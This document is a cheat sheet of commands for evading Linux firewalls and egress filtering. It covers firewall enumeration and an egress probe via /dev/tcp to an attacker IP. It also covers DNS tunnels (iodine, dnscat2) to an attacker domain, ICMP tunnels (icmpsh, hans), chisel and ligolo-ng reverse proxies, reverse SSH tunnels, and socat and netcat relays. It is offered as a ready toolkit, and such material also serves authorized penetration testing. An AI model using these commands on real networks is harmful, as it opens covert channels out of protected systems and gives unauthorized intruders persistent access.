# Firewall & Network Evasion

Bypass firewall rules and egress filtering on Linux.

---

## 1. Firewall Enumeration

```bash
# iptables
iptables -L -n -v 2>/dev/null
iptables -L -n -t nat 2>/dev/null

# nftables
nft list ruleset 2>/dev/null

# ufw
ufw status verbose 2>/dev/null

# firewalld
firewall-cmd --list-all 2>/dev/null

# Egress port check
for port in 80 443 53 8080 8443 22; do
    timeout 2 bash -c "echo >/dev/tcp/attacker_ip/$port" 2>/dev/null && echo "Port $port: OPEN" || echo "Port $port: BLOCKED"
done
```

---

## 2. DNS Tunneling

```bash
# iodine — Server (attacker)
iodined -f -c -P password 10.0.0.1 tunnel.attacker.com

# iodine — Client (target)
iodine -f -P password tunnel.attacker.com

# dnscat2 — Server
ruby dnscat2.rb tunnel.attacker.com

# dnscat2 — Client
./dnscat --dns domain=tunnel.attacker.com
```

---

## 3. ICMP Tunneling

```bash
# icmpsh — Attacker
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python icmpsh_m.py attacker_ip target_ip

# hans — Server
hans -s 10.0.0.1 -p password

# hans — Client
hans -c server_ip -p password
```

---

## 4. HTTP/HTTPS Tunneling

```bash
# chisel — Server (attacker)
chisel server -p 8080 --reverse

# chisel — Reverse SOCKS proxy
chisel client attacker:8080 R:1080:socks

# chisel — Reverse port forward
chisel client attacker:8080 R:9001:127.0.0.1:3306

# ligolo-ng — Proxy (attacker)
ligolo-proxy -selfcert -laddr 0.0.0.0:443

# ligolo-ng — Agent (target)
ligolo-agent -connect attacker:443 -ignore-cert
```

---

## 5. SSH Tunneling

```bash
# Local port forward
ssh -L 8080:internal_host:80 user@pivot

# Remote port forward
ssh -R 9001:127.0.0.1:3306 user@attacker

# Dynamic SOCKS proxy
ssh -D 1080 user@pivot
# proxychains nmap -sT internal_host

# Reverse SSH tunnel
ssh -R 4444:127.0.0.1:22 user@attacker
# Attacker: ssh -p 4444 target_user@127.0.0.1

# SSH over HTTP proxy
ssh -o "ProxyCommand=ncat --proxy-type http --proxy proxy:3128 %h %p" user@attacker
```

---

## 6. socat / netcat Relays

```bash
# socat port forward
socat TCP-LISTEN:8080,fork TCP:internal:80

# socat encrypted tunnel
socat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,verify=0,fork TCP:127.0.0.1:22

# netcat relay
mkfifo /tmp/backpipe
nc -lvp 8080 0</tmp/backpipe | nc internal_host 80 1>/tmp/backpipe
```

---

## 7. Common Allowed Egress Ports

| Port | Protocol | Notes |
|------|----------|-------|
| 80 | HTTP | Almost always allowed |
| 443 | HTTPS | Almost always allowed |
| 53 | DNS | Often allowed (UDP+TCP) |
| 8080 | HTTP alt | Common proxy port |
| 22 | SSH | Sometimes allowed |
